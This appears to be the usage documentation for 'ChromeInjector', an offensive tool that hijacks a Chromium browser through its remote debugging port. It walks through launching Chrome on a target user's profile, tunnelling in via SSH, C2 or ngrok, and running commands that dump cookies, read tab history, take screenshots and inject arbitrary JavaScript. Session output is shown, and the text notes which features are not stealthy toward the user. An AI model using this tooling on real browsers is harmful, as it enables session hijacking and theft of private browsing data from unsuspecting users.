# Starting
## Target
To inject in a chromium browser via CDP you need... A chromium based browser running with CDP enabled!

The simplest way is to run it locally. CDP runs on 9222 by default or you can customize the debugging port. If you do, don't forget to set a custom CDP port when creating your `ChromeInjector` within Injector Shell!
```cmd
"C:\Program Files\Google\Chrome\Application\chrome.exe" \
--disable-gpu --remote-debugging-port=[remote_debug_port] \
--user-data-dir="C:\Users\[target_user]\AppData\Local\Google\Chrome\User Data" \
--restore-last-session
```
### Remote CDP targets
You can use SSH local port forwarding, other C2 port redirection, or a proxy host. `ChromeInjector` and Injector Shell support proxies/alternate target host names.

## Injector Shell
```text
> python3 ./injectorshell.py -h
Usage: injectorshell.py [options]

Options:
  -h, --help            show this help message and exit
...
> python3 ./injectorshell.py
Welcome to the ChromeInjector Shell!
ci>
```

# Examples
## Getting info on available commands
```text
ci> help

Documented commands (use 'help -v' for verbose/'help <topic>' for details):

Commands
========
close  exec  exec_cocktails  list  new  set_property

...
ci> help exec
Usage: exec [-h]
            {close_tab, eval_script, get_all_cookies, get_domain_cookies, get_open_tab_cookies, get_tab_history,
            list_tabs, method_exec, new_tab, screen_shot_tabs} ...

Execute command

optional arguments:
  -h, --help            show this help message and exit

command:
  {close_tab, eval_script, get_all_cookies, get_domain_cookies, get_open_tab_cookies, get_tab_history, list_tabs, method_exec, new_tab, screen_shot_tabs}
                        cdp command, scripts,...
```

## New Injector and listing open tabs
You can create an injector with default target and port (127.0.0.1:9222) by running `new injector`. You can use tab-autocomplete with new injector to view additional options you can set, such setting a custom name using https and wss (i.e. using something like cloudflared or ngrok to tunnel in)

The first time an injector tries to enumerate pages it needs to use HTTP to get the debug WebSocket.  If for some reason you can't send HTTP at your target, but you can send WebSocket requests, and can enumerate the browser's debug WebSocket url, then you can set this manually `set_property injector_browser_ws`. If you can send HTTP at the target (which is usually the case), then this will get set automatically the first time you run a command.


```text
ci> list installed_commands
close_tab: Close chrome tab
eval_script: Execute script via ChromeInjector
get_all_cookies: Get all cookies via ChromeInjector
get_domain_cookies: Get specific domain cookies via ChromeInjector
get_open_tab_cookies: Get cookies from open tabs via ChromeInjector
get_tab_history: Get history from open tabs via ChromeInjector
list_tabs: List open tabs and windows
method_exec: Execute CDP method (with parameters)
new_tab: Open new window or tab
screen_shot_tabs: Screenshot tabs and write out PNGs
ci> new injector
Created ChromeInjector
ChromeInjector0: 127.0.0.1:9222
ci> exec list_tabs -i ChromeInjector0
Tabs:
[page] New Tab:
    chrome://newtab/
    ws://127.0.0.1:9222/devtools/page/2151B21DC2F98F27FF84A7063FA6FD83
[iframe] chrome-untrusted://new-tab-page/one-google-bar?paramsencoded=:
    chrome-untrusted://new-tab-page/one-google-bar?paramsencoded=
    ws://127.0.0.1:9222/devtools/page/0CA32C4340C89C71C10ED71DEC79413C
[page] Facebook - log in or sign up:
    https://www.facebook.com/
    ws://127.0.0.1:9222/devtools/page/088C2994FE1CFFBE11FC23C894555424
[page] Google Password Manager:
    chrome://password-manager/settings
    ws://127.0.0.1:9222/devtools/page/5CF6EEAC2376C2CA04D36F77BCF75325
[page] What's New:
    chrome://whats-new/
    ws://127.0.0.1:9222/devtools/page/A4CE6B33C13E1C59D0ACCA3941488ED9
[iframe] https://www.google.com/chrome/v2/whats-new/milestones/m132/?updated=false&enabled=PdfSearchify&internal=true&rolled=ToolbarPinning,PerformanceInterventionUI:
    https://www.google.com/chrome/v2/whats-new/milestones/m132/?updated=false&enabled=PdfSearchify&internal=true&rolled=ToolbarPinning,PerformanceInterventionUI
    ws://127.0.0.1:9222/devtools/page/7B8F3D2E7F80651E037DE04E4D12B93E
```

## Making regex and getting cookies
```text
ci> new regex -r '.*google.com.*'
Regex0: .*google.com.*
ci> exec new_tab -i ChromeInjector0 -u "https://google.com"
New ws_url:
ws://127.0.0.1:9222/devtools/page/F82457F355AD1A9CA018B13242DE1037
ci> exec get_open_tab_cookies -i ChromeInjector0 -r Regex0
[('https://www.google.com/', [{'name': 'OTZ', 'value': '...', 'domain': 'ogs.google.com', 'path': '/', 'expires': 1744404808, 'size': 33, 'httpOnly': False, 'secure': True, 'session': False, 'priority': 'Medium', 'sameParty': False, 'sourceScheme': 'Secure', 'sourcePort': 443}, {'name': 'NID', 'value': '...', 'domain': '.google.com', 'path': '/', 'expires': 1757624008.853806, 'size': 335, 'httpOnly': True, 'secure': True, 'session': False, 'sameSite': 'None', 'priority': 'Medium', 'sameParty': False, 'sourceScheme': 'Secure', 'sourcePort': 443}, {'name': 'OGPC', 'value': '...', 'domain': '.google.com', 'path': '/', 'expires': 1744404808, 'size': 15, 'httpOnly': False, 'secure': False, 'session': False, 'priority': 'Medium', 'sameParty': False, 'sourceScheme': 'Secure', 'sourcePort': 443}...], 'ws://127.0.0.1:9222/devtools/page/F82457F355AD1A9CA018B13242DE1037')]
```

## Using direct websocket url
```text
ci> exec get_tab_history -i ChromeInjector0 -w 'ws://127.0.0.1:9222/devtools/page/F82457F355AD1A9CA018B13242DE1037'
[('ws://127.0.0.1:9222/devtools/page/F82457F355AD1A9CA018B13242DE1037', [{'id': 18, 'url': 'https://www.google.com/', 'userTypedURL': 'https://google.com/', 'title': 'Google', 'transitionType': 'auto_toplevel'}, {'id': 20, 'url': 'https://www.google.com/search?...snip...', 'userTypedURL': 'https://www.google.com/search?...snip...&sclient=gws-wiz', 'title': 'chrome dev protocol - Google Search', 'transitionType': 'form_submit'}, {'id': 22, 'url': 'https://chromedevtools.github.io/devtools-protocol/', 'userTypedURL': 'https://chromedevtools.github.io/devtools-protocol/', 'title': 'Chrome DevTools Protocol', 'transitionType': 'link'}, {'id': 24, 'url': 'https://chromedevtools.github.io/devtools-protocol/tot/Animation/', 'userTypedURL': 'https://chromedevtools.github.io/devtools-protocol/tot/Animation', 'title': 'Chrome DevTools Protocol - Animation domain', 'transitionType': 'link'}, {'id': 26, 'url': 'https://chromedevtools.github.io/devtools-protocol/tot/Debugger/', 'userTypedURL': 'https://chromedevtools.github.io/devtools-protocol/tot/Debugger', 'title': 'Chrome DevTools Protocol - Debugger domain', 'transitionType': 'link'}, {'id': 28, 'url': 'https://chromedevtools.github.io/devtools-protocol/tot/Debugger/#method-resume', 'userTypedURL': 'https://chromedevtools.github.io/devtools-protocol/tot/Debugger', 'title': 'Chrome DevTools Protocol - Debugger domain', 'transitionType': 'link'}], 'ws://127.0.0.1:9222/devtools/page/F82457F355AD1A9CA018B13242DE1037')]
```

## Running arbitrary CDP command
```text
ci> exec method_exec -i ChromeInjector0 -r '.*github.*' -m 'Page.reload'
[('https://chromedevtools.github.io/devtools-protocol/tot/Debugger/#method-resume', None, 'ws://127.0.0.1:9222/devtools/page/F82457F355AD1A9CA018B13242DE1037')]
ci> exec method_exec -i ChromeInjector0 -m 'Runtime.evaluate' -a '{"expression": "alert(1);", "returnByValue": false, "silent": false}' -f -r '.*'
[('https://chromedevtools.github.io/devtools-protocol/tot/Debugger/#method-resume', {'result': {'type': 'undefined'}}, 'ws://127.0.0.1:9222/devtools/page/F82457F355AD1A9CA018B13242DE1037')]
```

## Cocktails (experimental)
These perform more complex chains of commands and logic. They take a single injector and then perform multiple commands. CURRENTLY NOT-OPSEC SAFE because they open up a new tab that's visible to the user. These are super buggy and often break with new versions of chrome.

You can currently do things like get history and site-engagement. These both require navigating to the target chrome-url (e.g. chrome://history) and reading the HTML.

```text
ci> exec_cocktails settings_navigator_cocktail -a get_rankings -i ChromeInjector0
[('ws://127.0.0.1:9222/devtools/page/0BB2C7847AF362339CC2881767B02674', {'result': {'type': 'object', 'value': [{'site': 'https://www.facebook.com/', 'rank': '7.75'}, {'site': 'https://chromedevtools.github.io/', 'rank': '3.9'}, {'site': 'https://www.google.com/', 'rank': '3.6'}, {'site': 'http://127.0.0.1:8080/', 'rank': '0.95'}]}}, 'ws://127.0.0.1:9222/devtools/page/0BB2C7847AF362339CC2881767B02674')]
```

## Executing Scripts
You can add your own scripts in-line or from a file (complete with tab completion ;-) )
- Make sure js files can be read without newlines. Especially look at comments (or just remove them)
- JS Pre-processing removes double spaces. Change source if that's a problem
- Make sure to use 'single quotes' in js files

```text
ci> new script -p scripts/page_refresh/refresh.js
Script0: location.reload();
ci> exec eval_script -s Script0 -i ChromeInjector0 -r (github.*)
Response:
[('https://chromedevtools.github.io/devtools-protocol/tot/Debugger/#method-resume', {'result': {'type': 'undefined'}}, 'ws://127.0.0.1:9222/devtools/page/F82457F355AD1A9CA018B13242DE1037')]
```
##  Debugging
Debugging is helpful if something isn't working. Start with `python3 ./injectorshell.py -l [loglevel] `